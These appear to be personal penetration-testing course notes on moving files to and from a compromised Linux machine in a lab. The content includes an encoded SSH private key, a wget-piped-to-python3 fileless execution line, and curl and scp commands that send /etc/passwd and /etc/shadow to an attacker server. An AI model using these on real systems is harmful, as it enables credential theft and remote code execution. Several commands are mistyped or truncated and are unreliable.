## Table of Contents

  - [Linux File transfer methods](#Linux\File\transfer\methods)
    - [Web Downloads with Wget and cURL](#Web\Downloads\with\Wget\and\cURL)
    - [Download a File Using cURL](#Download\a\File\Using\cURL)
    - [FilesLess download with wget:](#FilesLess\download\with\wget:)
  - [Web Upload](#Web\Upload)
      - [Linux - Creating a Web Server with PHP](#Linux\-\Creating\a\Web\Server\with\PHP)
      - [Linux - Creating a Web Server with Ruby](#Linux\-\Creating\a\Web\Server\with\Ruby)
      - [Download the File from the Target Machine onto the Pwnbox](#Download\the\File\from\the\Target\Machine\onto\the\Pwnbox)
      - [File Upload using SCP](#File\Upload\using\SCP)

## Linux File transfer methods
**Base 64 Encoding/Decoding**
- Depends on file size 
	- Requires strong network communication
Check File MD5 Hash -> md5sum  

We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.
**Encode SSH Key to Base64**
`cat id_rsa | base64 -w 0;echo`
We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.

```shell-session
gdxqpardo@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```


### Web Downloads with Wget and cURL

most common utilities in linux distributions to interact with web apps.

to download a sifle using wget->
wget https://raw.githubusercontent/com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

cURL ->
`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

### Download a File Using cURL

  Download a File Using cURL

```shell-session
gdxqpardo@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/Li
```

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.

---
### FilesLess download with wget:
`wget -q0- https://link/script.py | python3` -> executes the script right after it downloads

```
HTTP GET Request
gdxqpardo@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Print the response:
```shell-session
gdxqpardo@htb[/htb]$ cat <&3\\>
```

  
Enabling the SSH Server
```shell-session
gdxqpardo@htb[/htb]$ sudo systemctl enable ssh
```
Starting the SSH server: 
```
sudo systemctl start ssh
```

Checking for SSH Listening port:
```
netstat -lnpt
```


Download Files using SCP-
```
scp <username>@MACHINE_IP:/path/to/file.txt
```
## Web Upload

As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

The first thing we need to do is to install the `uploadserver` module.

**Start Web Server:**
```
sudo python3 pip install --user uploadserver
```

Now we need to creat a certificate. (Self-Signed):
	```
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
```
mkdir https && cd https
```
 
**Pwnbox - Start Web Server**
```shell-session
gdxqpardo@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```
From Compromised machine: 
upload the `/etc/passwd` and `/etc/shadow` files:

**(Multiple Files):**
```bash
curl -X POST http://MACHINE_IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
We used the option `--insecure` because we used a self-signed certificate that we trust


It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.
	Need python OR php to be installed

**Web Server with python3**
```bash
python3 -m http.server 8000
```


**Linux - Creating a Web Server with Python2.7**
```shell-session
gdxqpardo@htb[/htb]$ python2.7 -m SimpleHTTPServer
```

#### Linux - Creating a Web Server with PHP

  **Linux - Creating a Web Server with PHP**
```shell-session
gdxqpardo@htb[/htb]$ php -S 0.0.0.0:8000
```

#### Linux - Creating a Web Server with Ruby

  **Linux - Creating a Web Server with Ruby**
```shell-session
gdxqpardo@htb[/htb]$ ruby -run -ehttpd . -p8000
```

#### Download the File from the Target Machine onto the Pwnbox

  **Download the File from the Target Machine onto the Pwnbox**
```shell-session
gdxqpardo@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```


We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file using the SSH protocol.
#### File Upload using SCP

  **File Upload using SCP**

```shell-session
gdxqpardo@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```




